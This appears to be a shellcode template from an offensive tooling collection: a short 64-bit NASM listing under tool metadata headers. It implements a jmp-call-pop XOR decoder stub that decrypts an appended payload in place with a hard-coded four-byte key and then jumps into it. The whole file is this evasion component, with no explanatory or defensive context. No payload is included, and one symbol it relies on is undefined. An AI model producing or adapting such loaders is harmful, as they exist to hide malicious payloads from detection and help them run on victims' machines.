#!name##sc_test
#!itemType##scode
#!info##Shellcode test
#!hiveType##SCode
#!lang##nasm

BITS 64


section .text
global main
main:
    jmp GetShellcode

Archon:
    pop rsi ; save shellcode
    mov r10, rsi

    xor rax, rax    ; shellcode index
    xor rcx, rcx
    xor rbx, rbx
GetKey:
    call SetKey
    Key:
        db 0x61, 0x62, 0x63, 0x64
    Key_end: equ $ - Key

SetKey:
    pop rdi ; save key
    xor rdx, rdx    ; key index

    
Decrypt:
    mov byte cl, [rsi]
    mov byte bl, [rdi]
    xor cl, bl
    mov byte [rsi], cl
    inc rax
    inc rdx
    inc rsi
    inc rdi
    
    ;check shellcode
    cmp rax, ShellcodeEnd
    je Execute
    
    ; check key index
    cmp rdx, Key_end
    je GetKey
    jmp Decrypt
    
    

Execute:
    jmp r10   
    


GetShellcode:
    call Archon
